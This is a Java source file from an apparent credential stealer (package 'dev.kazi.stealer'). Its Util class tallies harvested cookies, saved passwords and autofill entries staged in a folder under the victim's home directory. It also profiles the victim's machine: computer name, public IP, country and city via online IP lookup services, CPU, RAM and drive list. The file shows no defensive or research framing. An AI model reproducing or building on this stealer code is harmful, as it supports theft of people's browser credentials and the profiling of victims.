package dev.kazi.stealer.utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.time.LocalTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.net.URL;
import java.util.Map;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.nio.file.Files;
import java.io.IOException;
import java.util.Scanner;
import java.util.Objects;
import java.io.File;

public class Util {

    public static int totalLineCountCookies;
    public static final int MAX_TITLE_LENGTH = 1024;
    public static String drive;
    public static int totalLineCountPasswords;
    public static int totalLineCountAutoFills;
    
    public static void lineCounterCookies() throws IOException {
        final File location = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\Cookies");
        if (!location.exists()) {
            return;
        }
        for (final File file : Objects.requireNonNull(location.listFiles())) {
            final String str = file.getName();
            final String cookies = System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\Cookies\\" + str;
            int lineCount = 0;
            int commentsCount = 0;
            final Scanner input = new Scanner(new File(cookies));
            while (input.hasNextLine()) {
                final String data = input.nextLine();
                if (data.startsWith("//")) {
                    ++commentsCount;
                }
                ++lineCount;
                ++Util.totalLineCountCookies;
            }
            input.close();
        }
    }
    
    public static String toString(final File file) {
        try {
            return new String(Files.readAllBytes(file.toPath()));
        }
        catch (final IOException e) {
            throw new RuntimeException(e);
        }
    }
    
    public static void lineCounterPasswords() throws IOException {
        final File location = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\General\\Passwords.txt");
        int lineCount = 0;
        int commentsCount = 0;
        if (!location.exists()) {
            return;
        }
        final Scanner input = new Scanner(location);
        while (input.hasNextLine()) {
            final String data = input.nextLine();
            if (data.startsWith("//")) {
                ++commentsCount;
            }
            ++lineCount;
            ++Util.totalLineCountPasswords;
        }
        input.close();
        Util.totalLineCountPasswords /= 3;
    }
    
    public static void lineCounterAutoFills() throws IOException {
        final File location = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\General\\AutoFills.txt");
        int lineCount = 0;
        int commentsCount = 0;
        if (!location.exists()) {
            return;
        }
        final Scanner input = new Scanner(location);
        while (input.hasNextLine()) {
            final String data = input.nextLine();
            if (data.startsWith("//")) {
                ++commentsCount;
            }
            ++lineCount;
            ++Util.totalLineCountAutoFills;
        }
        input.close();
        Util.totalLineCountAutoFills /= 2;
    }
    
    public static void printDrives() throws IOException {
        final FileWriter writer = new FileWriter(System.getProperty("user.home") + "\\Documents\\drives.txt", true);
        final BufferedWriter bufferWriter = new BufferedWriter(writer);
        final File[] listRoots;
        final File[] roots = listRoots = File.listRoots();
        for (final File root : listRoots) {
            Util.drive = "" + root;
            bufferWriter.write(Util.drive + ", ");
        }
        bufferWriter.close();
    }
    
    public static String getComputerName() {
        final Map<String, String> env = System.getenv();
        if (env.containsKey("COMPUTERNAME")) {
            return env.get("COMPUTERNAME");
        }
        return env.getOrDefault("HOSTNAME", "Unknown Computer");
    }
    
    public static String getCountry() throws IOException {
        final URL url = new URL("http://ip-api.com/line/?fields=1");
        final Scanner sc = new Scanner(url.openStream());
        final StringBuilder sb = new StringBuilder();
        while (sc.hasNext()) {
            sb.append(sc.next());
        }
        String result = sb.toString();
        result = result.replaceAll("<[^>]*>", "");
        return result;
    }
    
    public static String getCity() throws IOException {
        final URL url = new URL("http://ip-api.com/line/?fields=2");
        final Scanner sc = new Scanner(url.openStream());
        final StringBuilder sb = new StringBuilder();
        while (sc.hasNext()) {
            sb.append(sc.next());
        }
        String result = sb.toString();
        result = result.replaceAll("<[^>]*>", "");
        return result;
    }
    
    public static String getCPU() {
        return System.getProperty("os.arch");
    }
    
    public static String getCPUKernels() {
        return String.valueOf(Runtime.getRuntime().availableProcessors());
    }
    
    public static String convertTurkeyTime() {
        return DateTimeFormatter.ofPattern("HH:mm").format(LocalTime.now(ZoneId.of("GMT+3")));
    }
    
    public static String getTime() {
        String time = new SimpleDateFormat("dd.MM.yyyy").format(new Date());
        if (time.startsWith("0")) {
            time = time.replaceFirst("0", "");
        }
        return time;
    }
    
    public static String getIP() {
        try {
            final URL url = new URL("https://checkip.amazonaws.com/");
            final BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            return reader.readLine().trim();
        }
        catch (final Exception exception) {
            return null;
        }
    }
    
    public static File getFolder() {
        final File folder = new File(System.getProperty("user.home"), System.getProperty("user.name"));
        if (!folder.exists()) {
            folder.mkdirs();
        }
        return folder;
    }
    
    public static String getTotalRAM() {
        final long memorySize = Runtime.getRuntime().totalMemory() / 1024L / 1024L / 1024L;
        return memorySize + " GB";
    }
    
    static {
        Util.totalLineCountCookies = 0;
        Util.totalLineCountPasswords = 0;
        Util.totalLineCountAutoFills = 0;
    }
}
